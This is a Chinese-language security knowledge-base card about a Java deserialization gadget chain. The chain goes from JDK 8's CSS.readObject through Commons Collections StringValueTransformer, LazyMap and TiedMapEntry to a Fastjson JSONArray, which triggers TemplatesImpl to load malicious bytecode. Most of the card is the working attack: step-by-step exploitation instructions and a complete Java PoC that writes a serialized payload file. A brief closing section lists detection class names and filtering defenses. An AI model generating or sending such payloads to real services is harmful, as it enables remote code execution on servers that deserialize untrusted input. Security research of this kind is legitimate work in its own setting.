---
id: web-java-deser-stringvaluetransformer-css-jsonarray-templatesimpl
title: CSS 反序列化 + StringValueTransformer + JSONArray：把 transform 桥接成 toString 触发 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization
technique: stringvaluetransformer-transform-to-tostring-bridge
tags:
- java
- deserialization
- gadget
- commons-collections
- stringvaluetransformer
- lazymap
- tiedmapentry
- css
- hashtable
- fastjson
- jsonarray
- templatesimpl
- jdk8
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T02:00:37+08:00'
  notes: 已对照原文与15张图核对：CSS.readObject 重建 valueConvertor 时对 value 调 StyleContext.getStaticAttribute→thawKeyMap.get(value) 触发 hashCode；TiedMapEntry.hashCode/getValue→LazyMap.get→StringValueTransformer.transform→String.valueOf→JSONArray.toString→fastjson 序列化 TemplatesImpl getOutputProperties→newTransformer(图13/14 StringValueTransformer/String.valueOf 源码，图15 弹计算器)。卡片纠正了 baseFontSize 不必需与 enableUnsafeSerialization 非必需，属合理源码核对。未在本机复现；无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deser-stringvaluetransformer-css-jsonarray-templatesimpl/
draft: false
kb_aliases:
- StringValueTransformer transform 触发 toString
- transform to toString 桥
- CSS readObject 触发 hashCode
- javax.swing.text.html.CSS 反序列化利用
- LazyMap StringValueTransformer JSONArray
- fastjson JSONArray toString TemplatesImpl
- TemplatesImpl getOutputProperties 触发
---

## 一句话结论

在 JDK 8 且类路径同时存在 Commons Collections 3.x、Fastjson 1.x 时，`StringValueTransformer.transform(input)` 会把入参交给 `String.valueOf(input)` 从而调用其 `toString()`；把装有 `TemplatesImpl` 的 Fastjson `JSONArray` 作为 `LazyMap`/`TiedMapEntry` 的 key，再作为 value 塞进 `javax.swing.text.html.CSS` 的 `valueConvertor`，反序列化 `CSS` 时即可由 `hashCode` 一路走到 Fastjson 序列化 `TemplatesImpl` 的 getter，加载恶意字节码执行命令。

## 原理

完整链路：

```text
CSS.readObject
  → StyleContext.getStaticAttribute(value)
  → StyleContext.thawKeyMap.get(value)          // Hashtable.get 无条件计算 key.hashCode()
  → TiedMapEntry.hashCode()
  → TiedMapEntry.getValue()
  → LazyMap.get(jsonArray)                      // key 不存在，调用 factory.transform
  → StringValueTransformer.transform(jsonArray)
  → String.valueOf(jsonArray)
  → JSONArray.toString()                        // fastjson 序列化数组内元素
  → JavaBeanSerializer/FieldSerializer 调用 TemplatesImpl.getOutputProperties()
  → TemplatesImpl.newTransformer()
  → defineTransletClasses()/defineClass()
  → 恶意 AbstractTranslet 字节码静态初始化块执行
```

- **CSS 触发点**：JDK 8 的 `javax.swing.text.html.CSS.readObject()` 在 `s.defaultReadObject()` 后重建 `valueConvertor`：读取 entry 数量，再循环读取 key/value，并对二者调用 `StyleContext.getStaticAttribute()`。该方法内部执行 `thawKeyMap.get(value)`；`thawKeyMap` 是 `StyleContext` 静态块中初始化的 `Hashtable`，而 `Hashtable.get()` 会无条件调用 `value.hashCode()`。因此把恶意对象放在 CSS 序列化流的 value 位置即可在反序列化时触发其 `hashCode`，不需要该对象是 Hashtable 的 key。
- **transform→toString 桥**：`StringValueTransformer.transform(Object input)` 的实现只有 `return String.valueOf(input);`，而 `String.valueOf(Object)` 对非 null、非 String 对象直接返回 `input.toString()`。这把任何 `Transformer.transform()` 调用点（这里是 `LazyMap.get` 对缺失 key 调用 factory）变成对入参的 `toString()` 调用，不需要 `InvokerTransformer` 的反射，也不需要目标对象实现 `Transformer`。
- **TemplatesImpl 触发**：`JSONArray.toString()` 调用 fastjson 的 `JSONSerializer` 序列化数组元素；对普通 JavaBean 会调用其 public getter。`TemplatesImpl.getOutputProperties()` 内部调用 `newTransformer()`，当 `_name` 非空且 `_bytecodes` 为恶意字节码时，`defineTransletClasses()` 会 `defineClass` 并执行静态初始化块，形成 RCE。
- **为什么用 `TiedMapEntry`**：它的 `hashCode()`、`equals()`、`toString()` 都调用 `getValue()`，而 `getValue()` 返回 `map.get(key)`；把 map 设为 `LazyMap`、key 设为 `JSONArray` 即可把“任意 hashCode 触发”接到“任意 `transform` 调用”上。

## 触发条件

- 目标使用 Java 原生反序列化（`ObjectInputStream`）且攻击者可控制序列化流。
- JDK 8（或仍可访问内部 Xalan `TemplatesImpl` 的 JDK）；`javax.swing.text.html.CSS` 与 `StyleContext` 可用（桌面 JDK 通常包含，精简 JRE 可能裁剪）。
- 类路径存在 Commons Collections 3.x（提供 `StringValueTransformer`、`LazyMap`、`TiedMapEntry`）。
- 类路径存在 Fastjson 1.x（提供 `JSONArray`，其 `toString()` 会走 fastjson 序列化并调用 getter）。
- 攻击者能生成符合 `AbstractTranslet` 约束的恶意字节码，并设置 `TemplatesImpl` 的 `_name`、`_bytecodes`（可选 `_tfactory`）。

## 利用步骤

1. 生成继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的类，在静态初始化块写入命令，编译取得字节码。
2. 构造 `TemplatesImpl`，反射设置 `_name`、`_bytecodes`、`_tfactory`。
3. 创建 `JSONArray` 并加入该 `TemplatesImpl`，作为后续 `LazyMap` 的 key。
4. 用 `StringValueTransformer.getInstance()` 装饰空 `HashMap` 得到 `LazyMap`，再用 `TiedMapEntry(lazyMap, jsonArray)` 包一层。
5. 新建 `CSS`，用 `Hashtable` 放入任意 key（如 `"k"`）和 value=`TiedMapEntry`，反射把该 Hashtable 赋给 CSS 的 `valueConvertor` 字段。
6. 序列化 `CSS`，把字节流送入目标原生反序列化入口；读取时 CSS 重建表并调用 value 的 `hashCode`，链被执行。

## PoC

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.StringValueTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.swing.text.html.CSS;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CssStringValueTransformerPayload {
    public static void main(String[] args) throws Exception {
        // Evil.class 须继承 AbstractTranslet，命令写在静态初始化块
        byte[] code = Files.readAllBytes(Paths.get("Evil.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "x");
        setField(templates, "_bytecodes", new byte[][]{code});
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        Transformer transformer = StringValueTransformer.getInstance();
        Map lazyMap = LazyMap.decorate(new HashMap(), transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, jsonArray);

        Hashtable<String, Object> valueConvertor = new Hashtable<>();
        valueConvertor.put("k", entry);

        CSS css = new CSS();
        setField(css, "valueConvertor", valueConvertor);

        try (ObjectOutputStream oos =
                 new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
            oos.writeObject(css);
        }
    }

    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
}
```

```text
说明：CSS.readObject 重建 valueConvertor 时对 value 调用 StyleContext.getStaticAttribute，
进而触发 Hashtable.get 的 hashCode；value 位置放 TiedMapEntry 即可。
原 PoC 中的 baseFontSize 不在触发路径上，可省略。
```

## 变体与关联

- 变体：触发点可换成任何在反序列化时调用攻击者对象 `hashCode`/`equals`/`toString` 的类，例如 `HashMap.readObject` → `TiedMapEntry.hashCode`、`BadAttributeValueExpException.readObject` → `toString`、`XString`/`HotSwappableTargetSource` 的 `equals`；`StringValueTransformer` 负责把 `transform` 桥接到 `toString`。
- 变体：`JSONArray` 可换成其他在 `toString()` 中遍历元素并调用 getter/序列化的容器；若无 Fastjson，可改用其它能在 `toString` 阶段走到危险 sink 的对象。
- 版本注意：原 PoC 设置了 `org.apache.commons.collections.enableUnsafeSerialization=true`。该属性只影响 CC 3.2.2 中显式调用 `FunctorUtils.checkUnsafeSerialization` 的 functor（如 `InvokerTransformer`、`InstantiateTransformer`）；本链使用的 `StringValueTransformer`、`LazyMap`、`TiedMapEntry` 未调用该检查，因此该设置对本链不是必需（链上同时出现受保护 functor 时除外）。
- 关联卡片：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（`TiedMapEntry`/`LazyMap`/`TemplatesImpl` 的经典组合）；[[web-java-deserialization-jdk-hashtable-textandmnemonic-tostring]]（同类“反序列化时触发 toString”的 JDK 触发点）；[[web-java-deser-commonscollections-322-jsonobject-getter-bypass]]（利用 JSON 序列化调用 getter 的相近思路）。

## 检测与防御

- 检测：在原生反序列化流量/文件中检索 `javax.swing.text.html.CSS`、`StringValueTransformer`、`TiedMapEntry`、`LazyMap`、`com.alibaba.fastjson.JSONArray`、`TemplatesImpl` 等类名；监控反序列化后触发 `defineClass`、加载新类或执行 `Runtime.exec` 的行为。
- 修复：避免暴露原生 Java 反序列化入口，改用 JSON 等数据格式；升级/移除 Commons Collections 3.x 与不必要的 Fastjson；升级 JDK 并限制内部 Xalan 类访问。
- 加固：配置 JEP 290 `ObjectInputFilter` 类白名单/黑名单，默认拒绝 `TemplatesImpl`、`CSS`、`TiedMapEntry`、`LazyMap` 等链上类；注意仅关闭 CC 3.2.2 的 `enableUnsafeSerialization` 不能阻断本链。
